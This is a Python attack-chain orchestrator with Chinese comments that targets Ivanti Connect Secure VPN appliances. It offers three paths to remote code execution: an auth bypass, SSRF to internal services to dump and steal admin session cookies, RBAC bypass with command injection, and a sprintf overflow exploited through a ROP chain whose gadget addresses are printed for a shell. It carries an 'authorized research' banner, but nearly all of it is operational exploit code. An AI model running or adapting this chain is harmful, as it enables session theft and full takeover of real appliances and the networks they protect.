#!/usr/bin/env python3
"""
Ivanti Connect Secure — Full Attack Chain Orchestrator

攻击链总览（3条可选路径）：

Chain A: Pre-Auth → Session Steal → Admin → RCE
  [1] Pre-auth recon → 确认 Flask auth bypass
  [2] SSRF to localhost:8099 → session dump (需要SSRF向量)
  [3] 用 stolen admin DSID → 访问 admin UI
  [4] 通过 dmi.py 命令注入 or ObjectTag overflow → RCE

Chain B: Post-Auth (已有凭据) → RCE
  [1] 使用已知/获取的 admin 凭据登录
  [2] 通过 Web Proxy 访问恶意页面
  [3] ObjectTag::rewrite sprintf overflow → ROP → shell

Chain C: Internal Network → Full Takeover
  [1] 内网访问 localhost:8099 → session dump (无需认证)
  [2] 内网访问 localhost:8090 → RBAC bypass → 命令执行
  [3] 或使用 stolen session 访问 admin API → RCE

漏洞依赖图：
  ZD-10 (RBAC bypass)  ← 需要到达 8090
  ZD-11 (JWT bypass)   ← 需要到达 8099
  ZD-12 (Flask bypass) ← /api/my-session 已确认
  ZD-14 (arg injection) ← 需要 ZD-10
  ZD-02 (sprintf RCE)  ← 需要 Web Proxy session

Usage:
  python3 full_chain.py <target> [--chain A|B|C] [--ssrf-base URL] [--dsid COOKIE]

Examples:
  python3 full_chain.py https://10.0.0.1 --chain A --ssrf-base http://127.0.0.1
  python3 full_chain.py https://10.0.0.1 --chain B --dsid abc123
  python3 full_chain.py https://10.0.0.1 --chain C --ssrf-base http://127.0.0.1
"""

import sys
import argparse
import json

# Import our chain modules
sys.path.insert(0, "/root/ai/ivanti/exploit_chain")
from step1_preauth_recon import recon
from step3_internal_service_exploit import IvantiInternalExploit


def chain_a(target, ssrf_base):
    """Chain A: Pre-Auth → Session Steal → Admin → RCE"""
    print("=" * 70)
    print("  CHAIN A: Pre-Auth → Session Steal → Admin → RCE")
    print("=" * 70)

    # Step 1: Recon
    print("\n" + "─" * 50)
    print("  STEP 1: Pre-Auth Reconnaissance")
    print("─" * 50)
    results = recon(target)
    if not results:
        print("[-] Recon failed. Target not reachable.")
        return

    flask_eps = results.get("flask_endpoints", [])
    print(f"\n[+] Found {len(flask_eps)} Flask pre-auth endpoints")

    # Step 2: Session dump via SSRF
    print("\n" + "─" * 50)
    print("  STEP 2: Session Dump via SSRF to port 8099")
    print("─" * 50)
    print(f"  SSRF base: {ssrf_base}")
    print(f"  Target: {ssrf_base}:8099/api/v1/sessions/bulkfetch")
    print()

    exploit = IvantiInternalExploit(target, mode="ssrf", ssrf_base=ssrf_base)
    dsid = exploit.step_3_1_session_dump()

    if dsid:
        print(f"\n[!!!] ADMIN SESSION OBTAINED: DSID={dsid}")

        # Step 3: Use stolen session
        print("\n" + "─" * 50)
        print("  STEP 3: Admin API Access with Stolen Session")
        print("─" * 50)
        exploit.dsid = dsid
        exploit.mode = "session"
        exploit.step_3_3_system_info()

        # Step 4: Command execution
        print("\n" + "─" * 50)
        print("  STEP 4: Command Execution")
        print("─" * 50)
        exploit.step_3_4_command_exec()
    else:
        print("\n[-] No SSRF vector available or no active sessions")
        print("[*] To complete this chain, you need:")
        print("    1. A working SSRF to localhost (ports 8090/8099)")
        print("    2. At least one active admin session on the appliance")
        print()
        print("[*] Known SSRF candidates (all currently blocked):")
        print("    - xmltooling RetrievalMethod (CVE-2023-36661 — not exploitable in Ivanti context)")
        print("    - oauth-consumer.cgi state param (limited to port 7300)")
        print("    - Future zero-day SSRF")


def chain_b(target, dsid):
    """Chain B: Post-Auth → RCE via ObjectTag overflow"""
    print("=" * 70)
    print("  CHAIN B: Post-Auth → ObjectTag::rewrite → RCE")
    print("=" * 70)

    if not dsid:
        print("[-] Need valid DSID cookie. Use --dsid <cookie>")
        return

    print(f"\n  DSID: {dsid}")
    print(f"  Target binary: saml-server (NO Canary, NO PIE)")
    print()
    print("  Step 1: Login to admin UI with DSID cookie")
    print("  Step 2: Enable Web Access (Secure Application Manager / Web Proxy)")
    print("  Step 3: Host exploit HTML on attacker server")
    print("  Step 4: Browse to exploit through Ivanti Web Proxy")
    print("  Step 5: ObjectTag::rewrite sprintf overflow → ROP chain")
    print()
    print("  ROP Chain: execve(\"/bin/sh\", NULL, NULL)")
    print("    pop ebx;ret@0x080b3ac5 → \"/bin/sh\"@0x0820d701")
    print("    pop ecx;ret@0x08173773 → NULL")
    print("    pop edx;ret@0x0804db3f → NULL")
    print("    mov eax,0xb;ret@0x0814c950")
    print("    int 0x80@0x0804b3e8")
    print()
    print("  Generate exploit: python3 step4_post_auth_rce.py --exploit <offset>")
    print("  Serve exploit:    python3 step4_post_auth_rce.py --serve <offset>")


def chain_c(target, ssrf_base):
    """Chain C: Internal Network → Full Takeover"""
    print("=" * 70)
    print("  CHAIN C: Internal Network Direct Access → Full Takeover")
    print("=" * 70)

    print(f"\n  Connecting directly to internal services at {ssrf_base}")
    print(f"  No web binary authentication — services trust localhost")
    print()

    exploit = IvantiInternalExploit(target, mode="direct", ssrf_base=ssrf_base)
    exploit.run_full_chain()


def main():
    parser = argparse.ArgumentParser(
        description="Ivanti ICS Full Attack Chain Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://10.0.0.1 --chain A --ssrf-base http://127.0.0.1
  %(prog)s https://10.0.0.1 --chain B --dsid abc123def456
  %(prog)s https://10.0.0.1 --chain C --ssrf-base http://127.0.0.1
        """
    )
    parser.add_argument("target", help="Target Ivanti ICS URL")
    parser.add_argument("--chain", choices=["A", "B", "C"], default="A",
                        help="Attack chain: A=Pre-Auth, B=Post-Auth, C=Internal")
    parser.add_argument("--ssrf-base", default="http://127.0.0.1",
                        help="SSRF base URL for internal access")
    parser.add_argument("--dsid", help="Valid DSID cookie (for chain B)")

    args = parser.parse_args()

    print()
    print("  ╔══════════════════════════════════════════════════╗")
    print("  ║  Ivanti Connect Secure — Attack Chain Framework  ║")
    print("  ║  For Authorized Security Research Only           ║")
    print("  ╚══════════════════════════════════════════════════╝")
    print()

    if args.chain == "A":
        chain_a(args.target, args.ssrf_base)
    elif args.chain == "B":
        chain_b(args.target, args.dsid)
    elif args.chain == "C":
        chain_c(args.target, args.ssrf_base)


if __name__ == "__main__":
    main()
